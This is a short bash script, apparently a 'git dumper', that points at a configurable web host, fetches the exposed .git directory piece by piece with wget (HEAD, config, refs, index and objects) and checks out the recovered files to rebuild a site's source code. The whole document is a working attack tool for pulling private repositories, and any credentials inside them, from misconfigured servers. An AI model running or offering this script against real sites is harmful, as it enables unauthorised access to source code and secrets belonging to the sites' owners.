#!/bin/bash

## Edit Me ##
host="www.example.com/"   # Trailing / is required
dir="" # example blog/

## 
baseurl="http://${host}${dir}.git/"

OFS=$IFS
export IFS="/"
count=0
for word in $dir; do
    let count=$count+1
done
export IFS=$OFS

# FUNCTIONS HERP DERP
function get {
    wget $baseurl$1 -x -nH --cut-dirs=$count
}

function getsha {
    dir=${1:0:2}
    filename=${1:2:40}
    get "objects/${dir}/${filename}"
}

#####################

# 1 - git init
git init ${host}
cd ${host}

#2 - get static files
get "HEAD"
get "config"

#3 - get ref from HEAD
ref=`cat .git/HEAD|awk '{print $2}'`
get $ref

#4 - get object from ref
getsha `cat .git/$ref`

#5 - get index
get "index"

#6 - Try and download objects based on sha values
for line in `git ls-files --stage|awk '{print $2}'`
do
    getsha $line
done

#7 - try and get more objects based on log references
file="asdf"
prev=""
while [ "$file" != "" ]
do
    prev=$file
    file=`git log 2>&1 |grep "^error:"|awk '{print $5}'`
    if [ "$file" == "$prev" ]
    then
        break
    fi
    getsha $file
done

#8 - try and checkout files. It's not perfect, but you might get lucky
for line in `git ls-files`
do
    git checkout $line
done

